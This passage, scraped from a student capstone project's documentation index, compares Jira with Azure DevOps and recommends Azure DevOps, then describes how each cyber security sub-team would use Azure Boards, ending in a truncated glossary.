Comparison​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#detailed-comparison","content":" ","version":"Next","tagName":"h2"},{"title":"Task and Project Management​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#task-and-project-management","content":" Current State​  The Redback Ops teams currently use Microsoft Planner for task management. Microsoft Planner offers a straightforward, one-dimensional Kanban-style interface. It allows users to move tasks across swim lanes, assign task owners, manage short and simple checklists within tasks, set due dates, and apply tags, among other basic functionalities.  Jira Option​  Jira offers a scalable, highly customisable project management platform with advanced Kanban and Scrum capabilities. It is superior to Planner as it offers the opportunity to define custom workflows, issue types, and field configurations, as well as supporting Agile methodologies natively with tools for sprints, backlogs, and epics. Users can create detailed workflows, track issues, prioritise backlogs, and integrate with an extensive range of tools such as GitHub, Slack, and Confluence. Its reporting features provide actionable insights into team performance with burn-down charts, velocity tracking, and issue-resolution metrics. With all this functionality Jira can demand a steep learning curve, and could even be overwhelming for smaller, less complex projects. Jira is also typically more expensive on licensing costs.  Azure DevOps Option​  Redback Ops teams could also consider transition to Azure Boards, part of the Azure DevOps ecosystem. Boards provides built-in Kanban and Scrum boards, which integrate seamlessly with Azure Repos, Pipelines, and other DevOps tools, offering end-to-end project visibility and development lifecycle management. Boards offer customisable workflows, work items, and backlog management with strong support for Agile and Scrum methodologies. It is typically more cost-effective than Jira and easier to migrate to for teams already in the Microsoft ecosystem. Jira does have more integration opportunity, however with integration comes the requirement for configuration which can mean complex process and additional work. While there is reporting functionality Jira does tend to have more templated reporting available.  Recommendation: Both Jira and Azure offer their own benefits and would deliver a robust and effective solution in this space, no clear preference can be made for this criterion.  ","version":"Next","tagName":"h3"},{"title":"Code Repositories​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#code-repositories","content":" Current State​  Redback Operations currently utilise GitHub repositories for development work, benefiting from extensive functionality and tooling. However, the repositories used for Redback Operations' development pipelines are currently public, which poses significant risks. The most critical include the potential for leaked credentials or API keys if inadvertently committed by developers and missed in the code review process, and the accidental exposure of sensitive or private information, such as protected health information. These incidents could result in violation of privacy regulations, including the Privacy Act 1988, and lead to serious consequences for Deakin University.  Jira​  Jira does not provide native code repository functionality but integrates with the Atlassian code repository management platform, Bitbucket. It can also integrate with other third-party solutions like GitHub or GitLab. Bitbucket offers private repositories with access control, branch permissions, and in-depth Jira integration for tracking and traceability of issues and linking them to commits, branches, and pull requests. This integration can streamline development workflows by creating a unified environment for task management and code management. Moving to Jira would require either migrating to Bitbucket or continuing to use GitHub, which could complicate the setup. Additionally, Atlassian’s pricing model might increase costs for teams scaling repository usage. Managing multiple tools can add additional complexity despite the integration opportunity between the two.  Azure DevOps​  Azure DevOps offers Azure Repos, a fully integrated code repository solution with good security, branch policies, and pull request workflows. It offers both Git-based repositories and Team Foundation Version Control (TFVC) to accommodate diverse development needs. Azure Repos is deeply integrated with other Azure DevOps services, enabling seamless traceability between code changes, work items, and builds. This makes it appealing for organisations already using Azure Boards or Pipelines due to the native integration within the one platform. Azure DevOps provides enterprise-grade security features, such as built-in support for branch protection rules, advanced auditing, and private repositories by default, reducing the risk of accidental data exposure. Azure DevOps does provide less integration opportunity – but that is not an issue when it offers all the tooling we require natively within that platform. Transitioning from GitHub may require migrating repositories and adjusting workflows which would be a decent sized piece of work, but there are some built in tools that can assist.  Recommendation: Azure Repos is a good option under this criterion. The team currently operates within the Microsoft ecosystem and would benefit from a fully integrated DevOps solution within the same. Azure Repos offers a native, secure, and streamlined option for repository management, minimising the need for external integrations.  ","version":"Next","tagName":"h3"},{"title":"Pull Requests (PRs)​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#pull-requests-prs","content":" Current State​  Redback Operations currently uses PRs within GitHub. This approach offers the ability to review, discuss, approve PRs using workflows, perform code reviews, inline commenting, and status checks. These actions all work together to help enforce quality and prevent unintentional defects in the codebase. Unfortunately, the team can also, occasionally, face challenges around enforcing a consistent review process and integration with project management workflows, particularly regarding the limitations around associating pull requests with tasks in Microsoft Planner. The lack of deep integration with current task tracking tools limits traceability and the ability to streamline development pipelines.  Jira​  Jira offers indirect integration with PR workflows through Bitbucket, GitHub, or GitLab. When being utilised with Bitbucket, Jira enables comprehensive linking between issues and PRs, offering traceability from development to deployment. Developers can view PR details within Jira, enhancing visibility across all team members. Jira can automate transitions between issue statuses based on PR activity, improving workflow efficiency. This functionality does depend heavily on proper setup and the choice of an external repository platform. Using a combination of Jira and GitHub for PRs may fragment the development pipeline, creating additional complexity for maintaining integrations and workflows. While this approach offers flexibility, it also requires extensive configuration and regular updates to keep processes aligned.  Azure DevOps​  Azure DevOps natively supports pull requests using Azure Repos, offering a streamlined, secure, and integrated experience. PRs in Azure DevOps include built-in policies, such as mandatory reviews, work item linking, and customisable status checks, ensuring high code quality and compliance. The platform allows automated pipelines to trigger builds and tests on PR creation, providing immediate feedback to developers. Integration with Azure Boards ensures complete traceability, enabling users to link PRs with specific tasks, bugs, or features. For teams operating within the Microsoft ecosystem, the native integration reduces complexity and simplifies workflows. Azure DevOps provides advanced auditing capabilities, which are especially critical for regulated environments like Redback Operations, and to support assessment driven by the teaching team across Capstone. Transitioning to Azure DevOps may require adjustments to existing workflows, but the native tools and integrations significantly reduce setup and maintenance overhead.  Recommendation: Azure DevOps offers a more effective solution for managing pull requests due to its deep integration with other tools within the platform, namely, Azure Boards and Pipelines. Its built-in security and compliance features make it an ideal choice for Redback Operations. While Jira and Bitbucket provide a strong combination for teams using Atlassian tools, the lack of native support for pull requests within Jira itself introduces additional complexity. The unified nature of the Azure DevOps’ ecosystem makes it a more efficient and secure choice for managing PRs in alignment with Redback’s development workflows.  ","version":"Next","tagName":"h3"},{"title":"Document Repositories​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#document-repositories","content":" Current State​  Redback Operations uses GitHub repositories for storing and managing documents. While GitHub provides version control and collaboration features, it is not the best choice for structured document management or workflows. Lack of features such as custom metadata, advanced search, and integrated approval workflows can limit its usability for large-scale or compliance-critical documentation. Additionally, versioning for non-code documents (e.g., policies or designs) can feel clunky in a Git-based system.  Jira​  Jira does not natively offer document repository functionality; however, Atlassian’s Confluence integrates well with Jira to provide strong document management capabilities. Confluence supports structured pages, hierarchical organisation, metadata, and collaborative editing, making it a powerful tool for documentation. Linking documents stored in Confluence to Jira issues improves traceability between project tasks and supporting documentation. This combination enables teams to centralise documentation and manage it alongside task tracking. The challenge with this option is the reliance on a separate tool (Confluence) which adds cost and requires additional setup and maintenance. Teams would need to migrate existing documents to Confluence and adapt new workflows for the new system.  Azure DevOps​  Azure DevOps includes Wikis for lightweight documentation and markdown-based collaboration, allowing teams to create and manage project documentation directly within the platform. For more structured or enterprise-grade document management, Azure DevOps can integrate with Microsoft SharePoint, leveraging its extensive features such as metadata tagging, advanced search, version control, and approval workflows. SharePoint provides a centralised repository for storing and managing large volumes of documents, ensuring compliance with organisational policies and regulations. This integration allows teams to link SharePoint documents to Azure Boards work items, pull requests, or pipelines, enhancing traceability. SharePoint also integrates well with other Microsoft tools like Teams and Outlook, creating a complete collaboration ecosystem. Combining Azure DevOps Wikis for quick documentation and SharePoint for comprehensive document management offers flexibility and scalability, tailored to the team’s needs.  Recommendation: Azure DevOps provides a versatile approach to documentation by combining its native Wiki functionality with the powerful capabilities of SharePoint. This dual-option setup aligns well with Redback Operations’ Microsoft ecosystem and offers a secure, integrated solution for managing documentation. For teams with structured document requirements, leveraging SharePoint alongside Azure DevOps ensures comprehensive and compliant document management while minimising the need for third-party tools.  ","version":"Next","tagName":"h3"},{"title":"Integrations​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#integrations","content":" Current State​  Redback Operations uses Microsoft Planner for task management and GitHub for code repositories and associated processes. Outside of this they typically work in Microsoft Teams as their digital workspace. Tighter integration between tools would be very beneficial to enhance collaboration and efficiency. Currently other than embedding the planner boards within Teams, the connections are very limited at best, leading to manual work and double handling in certain processes.  Jira​  Jira supports a wide range of integrations with Atlassian tools (Bitbucket, Confluence, Trello) and third-party platforms (like Slack, GitHub, and Microsoft Teams). It offers APIs, webhooks, and Atlassian Marketplace apps to extend functionality and customised integrations to fit existing workflows. Managing multiple integrations can increase administrative complexity though, and the quality of third-party integrations can vary. Ensuring they remain up to date with changing requirements and software updates is essential and can mean additional work.  Azure DevOps​  Azure DevOps provides built-in integrations with other Microsoft tools like Teams, Outlook, and Power BI, creating a streamlined ecosystem for teams working within the Microsoft stack. It also supports external integrations through its REST APIs and service hooks, integrating with platforms like GitHub, Jira, and various CI/CD tools. The native integrations with Azure Boards, Pipelines, and Repos reduce the reliance on external tools, simplifying workflows and improving productivity.  Recommendation: While Jira may offer more integration flexibility and supports a broader ecosystem, Azure DevOps can offer a completely unified experience within the Microsoft ecosystem. For Redback Operations, where Microsoft tools are already in use, Azure DevOps offers the most seamless integration, making it the preferred choice for this criterion.  ","version":"Next","tagName":"h3"},{"title":"Reporting and Analytics​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#reporting-and-analytics","content":" Current State​  Redback Operations relies largely on manual process to report on work that has been completed throughout the trimester. Students complete manual updates and submit these for review. Tasks tracked in Microsoft Planner, while can be dumped into a csv file for analysis, remain attached to a heavily manual process and there is currently no dashboard or intuitive reporting tools that can help convert the work done into a useful and effective summarised output. There is not currently an easy way to generate insights and track performance metrics across projects. With this this approach which limits the ability to create tailored reports or dashboards, it can lead to delays in decision-making meaning less progress per trimester, and reduced visibility into project performance.  Jira​  Jira offers advanced reporting and analytics with built-in dashboards, custom filters, and gadgets. Teams can track project progress, burndown charts, sprint performance, and issue resolution times. Jira offers integration with Atlassian Analytics and other tools like Confluence to enhance reporting capabilities further, allowing teams to consolidate data from multiple sources into useful insights that can greatly support continuous improvement. The major limitation is that these advanced analytics often require additional tools or licensing, increasing costs and complexity.  Azure DevOps​  Azure DevOps provides comprehensive reporting and analytics capabilities through built-in dashboards, query-based reports, and integration with Power BI. These features allow teams to track work item progress, pipeline performance, and code quality metrics across projects. Power BI integration offers advanced data visualisation, enabling teams to create custom dashboards that consolidate data from Azure DevOps and other sources into easy to consume diagrams and tables. The native reporting tools are easy to use and require minimal setup, they also emphasise traceability, ensuring all data is tied back to work items or code changes.  Recommendation: Azure DevOps is the preferred choice for reporting and analytics due to its native integration with Power BI, a Microsoft tool aligning with Redback Operations’ existing Microsoft ecosystem. Its advanced data visualisation capabilities, and traceability features, make it the preferred tool for creating tailored dashboards that consolidate project data and metrics. Azure DevOps emphasises auditability, providing detailed tracking of user activities across work items, pull requests, and pipelines. This transparency could enable the teaching team to monitor who has completed specific tasks, contributed code, or updated documentation, fostering accountability and simplifying assessment for the unit. While Jira offers strong analytics capabilities, the reliance on additional tools for advanced reporting adds complexity. Azure DevOps delivers a more streamlined, integrated, and auditable solution for tracking and visualising student and project performance.  ","version":"Next","tagName":"h3"},{"title":"Ease of Use​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#ease-of-use","content":" Current State​  Redback Operations currently uses Microsoft Planner for task management and GitHub for repositories, which provides a reasonably simple and familiar interface for users. However, the simplicity of particularly Microsoft Planner comes at the cost of limited functionality, lacking the ability to handle complex workflows, advanced project management, and integrations. The current GitHub processes can be a little more challenging particularly around the use of the Docusaurus tool with Markdown conversion and the pull request process both playing a role in the challenging nature of posting completed works and research in the centralised repository.  Jira​  Jira is a feature-rich platform with advanced capabilities for project management and Agile workflows, such as Scrum and Kanban boards, issue hierarchies, and custom workflows. Its complexity can be overwhelming for new users, requiring training and onboarding to fully utilise its capabilities, this could be a major issue with the limited time available in each trimester to make significant technical contributions. The interface has improved with recent updates, but it remains far less intuitive than simpler tools like Microsoft Planner. Jira's flexibility is a strength, particularly with experienced technical teams, but for less experienced users like many students, the learning curve can hinder adoption.  Azure DevOps​  Azure DevOps is designed to integrate seamlessly with the Microsoft ecosystem, providing a familiar interface for teams already using Microsoft tools. Features like Azure Boards, Repos, and Pipelines are intuitive for users familiar with tools like Planner and GitHub, making for a much easier transition. The platform's design balances usability and advanced functionality, ensuring accessibility for both technical and non-technical users. Integrated wikis, dashboards, and reporting tools are easy to navigate, leading to improved team collaboration.  Recommendation: Azure DevOps offers a gentler learning curve for Redback Operations due to its alignment with existing tools and workflows. While Jira is more feature-rich, Azure DevOps prioritises usability and accessibility, making it the preferred choice.  ","version":"Next","tagName":"h3"},{"title":"Scalability​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#scalability","content":" Current State​  Microsoft Planner and GitHub are effective for small to medium-sized projects but lack the features needed to scale up and facilitate more complex, multi-team operations. Limited task hierarchy, workflow automation, and reporting capabilities hinder scalability, and the lack of integration between the two means there is a lack of efficiency hindering growth.  Jira​  Jira excels in scalability, supporting complex, large-scale operations with customisable workflows, issue hierarchies, and advanced reporting. It’s highly configurable and can handle extensive Agile projects, making it suitable for organisations with diverse teams and processes. Scaling Jira requires very careful management of configurations and integrations, which often means increased complexity.  Azure DevOps​  Azure DevOps is also highly scalable, designed for enterprises managing complex development pipelines, multiple teams, and integrated workflows. It has a modular architecture which supports scaling specific components, like Azure Boards for task management or Azure Pipelines for CI/CD processes. Integration with Azure ensures scalability in cloud-based environments, while SharePoint offers a scalable solution for document management. Azure DevOps aligns well with Redback Operations’ growing needs, supporting advanced reporting, cross-team collaboration, and automation.  Recommendation: Both Jira and Azure DevOps are highly scalable, but Azure DevOps offers a smoother growth path for Redback Operations by leveraging its integration with the Microsoft ecosystem. Its modular approach and flexibility make it the more practical choice for scaling operations efficiently.  ","version":"Next","tagName":"h3"},{"title":"Cost​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#cost","content":" Current State​  Redback Operations primarily uses Microsoft 365 and GitHub, which are cost-efficient for basic task and code management. However, scaling these tools for more complex project management, compliance, or structured documentation requires third-party tools, increasing costs.  Jira​  Jira operates on a subscription model, with pricing based on the number of users. Costs can escalate when paired with required tools like Confluence or Bitbucket for documentation and code management. While the Atlassian suite provides comprehensive functionality, organisations must budget for these additional tools, making it less cost-effective for teams already invested in other ecosystems.  I have made the following estimation on pricing for this solution for 100 Students x 3 months:  Jira – Standard 7.53peruserpermonth=7.53 per user per month = 7.53peruserpermonth=2,259 Bitbucket – Standard 3.30peruserpermonth=3.30 per user per month = 3.30peruserpermonth=990 Confluence – Standard 5.16peruserpermonth=5.16 per user per month = 5.16peruserpermonth=1,548  Jira Forecast Total - $4,797 per trimester  Azure DevOps​  Azure DevOps is available as part of Microsoft’s suite of tools, often included in existing Microsoft 365 or Azure subscriptions, which can reduce costs for organisations such as Redback, already in the Microsoft ecosystem. Integration with SharePoint and Teams, typically included in enterprise licenses, further minimises additional expenses. The cost model is user-based but scales favourably compared to Jira when leveraging existing licenses.  Given there is currently M365 licensing in place for Deakin Students the following assumptions can be made:  Most users can be added as stakeholders as an inclusion in their existing M365 licensing. Only Leaders require basic licensing which is likely to stay under paid licences per trimester. For this assessment, we are assuming there are 20 basic licences required each trimester at $9.28 per user per month.  Azure DevOps Forecast Total - $556.80 per trimester  Recommendation: As demonstrated in the above figures, Azure DevOps provides a more cost-effective solution, leveraging existing Microsoft investments. While Jira is competitive for standalone implementations, the added cost of supplementary tools makes Azure DevOps the preferred option.  ","version":"Next","tagName":"h3"},{"title":"Other Considerations​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#other-considerations","content":" Current State​  Redback Operations currently uses a combination of Microsoft Planner, GitHub, and Teams, creating a fragmented ecosystem. While these tools fulfill basic needs, they lack seamless integration, leading to inefficiencies and manual effort. Transitioning to a unified platform can address these challenges by enhancing collaboration and improving workflow automation.  Jira​  Jira is a widely used platform recognised as an industry standard for Agile project management. The extensive Atlassian ecosystem, marketplace, and support for third-party integrations make it a strong option for teams across industries. Implementing Jira can improve collaboration with external teams and vendors already familiar with the tool. The lack of native integration with core tools already in place, like Teams and SharePoint, would require additional customisation and implementation of further new tools like Confluence to close the gaps.  Azure DevOps​  Azure DevOps provides a tightly integrated, end-to-end solution within the Microsoft ecosystem. Its seamless interaction with Teams and SharePoint enables streamlined communication, document management, and task tracking. This integration reduces the need for third-party tools, simplifying workflows and improving productivity. Azure DevOps' focus on delivering a cohesive experience aligns with Redback Operations’ existing tools, ensuring a smoother transition and reducing overhead.  Recommendation: While Jira offers the benefit of being an industry-standard platform, Azure DevOps provides a more integrated and complete solution for Redback Operations. Its alignment with existing Microsoft tools ensures a unified ecosystem, reducing complexity and enhancing efficiency. This will result in students being able to focus on their technical contributions to the products Redback Operations are developing in health and fitness rather than spending time on enterprise architecture, implementation of internal tools and systems, enablement for these platforms and onboarding each trimester. This makes Azure DevOps the stronger choice for teams already invested in the Microsoft environment as Redback Operations are.  ","version":"Next","tagName":"h3"},{"title":"Comparison of Migration​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#comparison-of-migration","content":" Aspect\tJira Migration\tAzure DevOps MigrationTask Migration\tStraightforward CSV import with field mapping.\tStraightforward CSV import with field mapping. Code Integration\tRetain GitHub; integration is simple. Alternatively, Bitbucket, part of the Atlassian Suite.\tOption to retain GitHub or migrate to Azure Repos. Documentation\tRequires Confluence (additional tool).\tAzure Wiki is built-in or use SharePoint. Training\tFocus on Jira and Confluence.\tFocus on Azure Boards, Repos, and Pipelines. Scalability\tHighly scalable with Atlassian ecosystem.\tUnified platform for scalability.  As far as migration from Microsoft Planner to each of the above alternative solutions goes, Azure DevOps once again offers the best overall option being more straightforward when it comes to enablement, provides unified platform including repos protected by credentials delivering the security that is currently lacking in GitHub.  ","version":"Next","tagName":"h2"},{"title":"Recommendation – Azure DevOps​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#recommendation--azure-devops","content":" Following the above investigation, it is recommended that we move to the Azure DevOps platform rather than Jira for the following reasons:  While Jira excels in project management and agile workflows when paired with GitHub and Confluence, this would mean the introduction of a whole new product suite to achieve the same functionality as Azure DevOps which would be more costly and will still leave users moving between platforms.Azure DevOps provides a much more integrated, end-to-end experience for task management, code, and documentation and can integrate well with other tools being used like SharePoint and Teams.Azure DevOps is more cost effective.Azure DevOps gives us the flexibility to decide whether we want to continue using GitHub or move to the native repos and pipelines within the platform.Azure DevOps is strong in all areas, whereas there are limitations with the Atlassian product suite.Azure DevOps will be far easier for access control as mentors can control access easily through Deakin M365 IAM control.Opens the door to utilising Azure for cloud requirements over Google (GCP) providing further integration still throughout the company’s tooling. ","version":"Next","tagName":"h2"},{"title":"Cyber Security Team Use Cases & Examples","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples","content":"","keywords":"","version":"Next"},{"title":"5. Team-Specific Usage and Processes​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#5-team-specific-usage-and-processes","content":" This section provides detailed guidance on how each sub-team within the Redback Operations Cyber Security Team will utilize Azure Boards. The focus is on aligning Azure Boards' capabilities with the specific responsibilities and workflows of the SecDevOps, Blue Team, Infrastructure, Red Team, and GRC teams.  By customizing Azure Boards for each team, Redback Operations aims to enhance collaboration, improve task management, and streamline the execution of security and IT operations.    ","version":"Next","tagName":"h2"},{"title":"5.1 SecDevOps Team​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#51-secdevops-team","content":" The SecDevOps team is responsible for integrating security into the software development lifecycle, automating security testing, and ensuring that secure coding practices are followed throughout the development process. Azure Boards will be used by the SecDevOps team to manage these activities efficiently.  5.1.1 Key Responsibilities​  Managing CI/CD pipelines and ensuring security is integrated at every stage. Conducting code reviews and automating security testing. Overseeing the implementation of secure development practices.  5.1.2 Usage of Azure Boards​  Task Management  The SecDevOps team will use Azure Boards to track tasks related to CI/CD pipeline configuration, security testing automation, and code reviews. Work items will be created for each task, with detailed descriptions, assigned team members, and due dates.  CI/CD Pipeline Integration​  Azure Boards will be integrated with GitHub, allowing the SecDevOps team to link work items to specific commits, branches, and pull requests. This integration will help manage code reviews and ensure that security checks are performed before code is merged.  Security Testing with SonarQube​  SonarQube will be integrated with Azure Boards to automate the process of scanning code for security vulnerabilities. Results from SonarQube scans will be linked to work items in Azure Boards, enabling the team to track and remediate issues efficiently.  Sprint Planning​  Sprints will be used to manage the workload of the SecDevOps team. During sprint planning, tasks will be moved from the backlog into the sprint, prioritized based on their importance to ongoing projects. The sprint board will provide a visual representation of task progress, helping the team stay on track.  Workflow Example​  A typical workflow for the SecDevOps team might involve creating a task for setting up a new CI/CD pipeline, linking it to a GitHub branch, and automating security tests using SonarQube. As the pipeline is configured, the task would move through stages like &quot;To Do,&quot; &quot;In Progress,&quot; and &quot;Completed,&quot; with code reviews and security checks being documented in Azure Boards.    ","version":"Next","tagName":"h3"},{"title":"5.2 Blue Team​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#52-blue-team","content":" The Blue Team is tasked with defending the organization's infrastructure against cyber threats. Their primary activities include monitoring for potential threats, responding to security incidents, and developing strategies to mitigate risks. Azure Boards will help the Blue Team manage these activities effectively.  5.2.1 Key Responsibilities​  Monitoring and responding to security incidents. Conducting threat hunting and proactive threat analysis. Developing and implementing mitigation strategies for identified threats.  5.2.2 Usage of Azure Boards:​  Incident Response Management​  The Blue Team will use Azure Boards to track security incidents from detection through to resolution. Work items will be created for each incident, with detailed logs of the incident, steps taken during the investigation, and final resolution.  SIEM Tool Integration​  Azure Boards will be integrated with SIEM tools, enabling the automatic creation of work items when security alerts are triggered. These work items will be prioritized and assigned to team members based on the severity of the incident.  Threat Hunting​  Tasks related to threat hunting and analysis will be managed in Azure Boards. The Blue Team will document their hypotheses, findings, and any actions taken in response to potential threats.  Vulnerability Management​  The Blue Team will track vulnerabilities identified through monitoring and threat analysis in Azure Boards. Each vulnerability will be logged as a work item, with details on the affected systems, severity, and recommended remediation steps.  Workflow Example​  When a security alert is triggered by the SIEM system, a work item is automatically created in Azure Boards. The Blue Team investigates the incident, documents their findings, and takes appropriate actions to contain and mitigate the threat. The work item is then moved through stages like &quot;Detection,&quot; &quot;Investigation,&quot; &quot;Mitigation,&quot; and &quot;Resolution.&quot;    ","version":"Next","tagName":"h3"},{"title":"5.3 Infrastructure Team​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#53-infrastructure-team","content":" The Infrastructure Team is responsible for managing and maintaining the organization's IT infrastructure, including systems administration, network management, and infrastructure support. Azure Boards will be used to organize and track these essential activities.  5.3.1 Key Responsibilities​  Managing system administration tasks, including server maintenance and patch management. Configuring and maintaining network devices, firewalls, and monitoring systems. Ensuring the availability, security, and performance of IT infrastructure.  5.3.2 Usage of Azure Boards​  System Administration​  The Infrastructure Team will use Azure Boards to manage tasks related to server maintenance, user account management, and patch deployment. Each task will be logged as a work item, with details on the scope, timeline, and responsible team members.  Network Management​  Tasks related to network configuration, firewall management, and system monitoring will be tracked in Azure Boards. For example, a task might be created for updating firewall rules or configuring a new VLAN, with progress tracked through different stages.  Nagios Integration​  Nagios, used for system monitoring, will be integrated with Azure Boards to log alerts and issues as work items. This integration ensures that the team can respond quickly to any system outages or performance issues.  Patch Management​  Azure Boards will help the Infrastructure Team manage the patching of servers, workstations, and network devices. Tasks will be created for each patch, with stages like &quot;Scheduled,&quot; &quot;In Progress,&quot; &quot;Testing,&quot; and &quot;Completed&quot; to track progress.  Workflow Example​  A task is created in Azure Boards for a temperature alert in Nagios. The task is scheduled and moves through stages to alert the team and identify the cause behind the temperature warning. If Nagios detects any issues during or after the sensor is resolved, a new work item is created, and the Infrastructure Team is alerted to investigate and resolve the issue again.    ","version":"Next","tagName":"h3"},{"title":"5.4 Red Team​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#54-red-team","content":" The Red Team focuses on identifying and exploiting vulnerabilities within the organization's systems to simulate real-world cyberattacks. This team's activities are crucial for testing and improving the organization's defenses. Azure Boards will be instrumental in managing their operations.  5.4.1 Key Responsibilities​  Conducting penetration tests to identify security weaknesses. Performing vulnerability assessments and recommending remediation actions. Simulating real-world cyberattacks to test the organization's defences and validating incident response strategies.  5.4.2 Usage of Azure Boards:​  Penetration Testing​  The Red Team will use Azure Boards to manage and document their penetration testing activities. Each test will be tracked as a work item, with details on the scope, objectives, and findings.  Vulnerability Assessment​  Vulnerabilities identified during tests or assessments will be logged as work items in Azure Boards. The Red Team will provide detailed descriptions of each vulnerability, including its severity and potential impact, and will track the remediation process.  Integration with Testing Tools​  Tools like Kali Linux and Burp Suite will be used by the Red Team for testing, with results documented in Azure Boards. Work items can be linked to specific test cases or tools, providing a clear record of the testing process.  Reporting and Collaboration​  After completing a test or assessment, the Red Team will use Azure Boards to generate reports and collaborate with other teams on remediation efforts. Work items related to remediation will be tracked and assigned to the appropriate teams.  Workflow Example​  A penetration test is planned and documented as a work item in Azure Boards. The Red Team conducts the test using Kali Linux and Burp Suite, logging any vulnerabilities they discover. These vulnerabilities are then tracked through the remediation process, with detailed reports generated and shared with other teams.    ","version":"Next","tagName":"h3"},{"title":"5.5 GRC Team​","type":1,"pageTitle":"Cyber Security Team Use Cases & Examples","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Cyber Security Team Use Cases & Examples#55-grc-team","content":" The Governance, Risk, and Compliance (GRC) Team ensures that the organization adheres to industry standards, regulatory requirements, and internal policies. They manage compliance, risk assessments, and policy development. Azure Boards will help the GRC Team organize and track these activities.  5.5.1 Key Responsibilities​  Conducting compliance audits and ensuring adherence to regulatory requirements. Performing risk assessments and managing identified risks. Developing and enforcing security policies and procedures.  5.5.2 Usage of Azure Boards:​  Compliance Audits​  The GRC Team will use Azure Boards to plan and execute compliance audits. Work items will be created for each audit, with details on the scope, standards being audited, and any findings that require attention.  Risk Assessments​  Risks identified during assessments will be tracked as work items in Azure Boards. Each risk will include details on its likelihood, impact, and mitigation strategies, with ongoing monitoring and updates tracked in the system.  Policy Development​  Tasks related to the development, review, and implementation of security policies will be managed in Azure Boards. Each policy will be tracked through stages from drafting to approval and implementation.  Collaboration with Other Teams​  The GRC Team will work closely with other teams, such as Infrastructure and SecDevOps, to ensure that compliance and risk management efforts are aligned with operational practices. Azure Boards will be used to track these collaborative tasks and ensure that all teams are following the same guidelines.  Workflow Example​  A compliance audit is scheduled and documented as a work item in Azure Boards. The audit is conducted, and any findings are logged as separate work items, with details on the required corrective actions. The GRC Team collaborates with the relevant teams to ensure that all compliance issues are addressed, tracking the progress of these efforts in Azure Boards.   ","version":"Next","tagName":"h3"},{"title":"Glossary","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Glossary","content":"","keywords":"","version":"Next"},{"title":"10. Glossary​","type":1,"pageTitle":"Glossary","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Glossary#10-glossary","content":" Provided in this section is a glossary of all relevant terms and object definitions.  Area Path Defines the hierarchical structure within Azure Boards, representing teams or sub-teams. It helps organize and categorize work items based on team responsibilities. Epic A large body of work that encompasses multiple features or tasks. Epics represent significant initiatives or projects that are broken down into smaller, more manageable work items. Feature A specific function or deliverable derived from an epic. Features typically take a few sprints to complete and provide value to the project, such as a new security tool rollout or system upgrade. User Story A smaller, actionable work item that describes a specific requirement from the perspective of the end user. User stories are typically completed within a single sprint and contribute to a feature's completion. Task The smallest unit of work, which is used to track individual activities required to complete user stories or features. Tasks are assigned to team members and have detailed descriptions, deadlines, and priorities. Bug A work item representing a defect or issue that needs to be resolved. Bugs are identified during testing or operations and tracked until they are fixed. Board A visual interface within Azure Boards that displays work items in different columns, representing stages of progress (e.g., To Do, In Progress, Done). Each team has its own board to manage tasks and track work. Sprint A time-boxed iteration, typically two weeks long, in which a set of tasks or user stories are planned and completed. Sprints help teams 